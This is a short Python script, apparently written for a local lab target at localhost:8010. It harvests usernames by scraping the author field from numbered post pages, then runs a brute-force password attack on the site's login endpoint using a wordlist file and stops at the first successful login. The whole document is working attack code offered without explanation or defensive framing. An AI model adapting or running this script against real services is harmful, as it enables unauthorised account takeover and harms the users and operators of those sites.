import sys
import requests
import re

headers = {
    'Accepts': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Content-Type': 'application/x-www-form-urlencoded',
}
users = []

f = open("passwords.txt", "r")
content = f.read()
passwords = content.split('\n')
passwords = passwords[:-1]
f.close()

for id in range(1, 75):
    url = f'http://localhost:8010/post?id={id}'
    response = requests.get(url=url, headers=headers)
    match = re.search(r'<h3>Автор: (.*?)</h3>', response.text)
    if match:
        if match[1] not in users:
            users.append(match[1])

url = 'http://localhost:8010/login'
for user in users:            
    for pas in passwords:
        body = f'username={user}&password={pas}'
        response = requests.post(url=url, headers=headers, params=body)
        if response.status_code == 200:
            print(response.text)
            sys.exit()
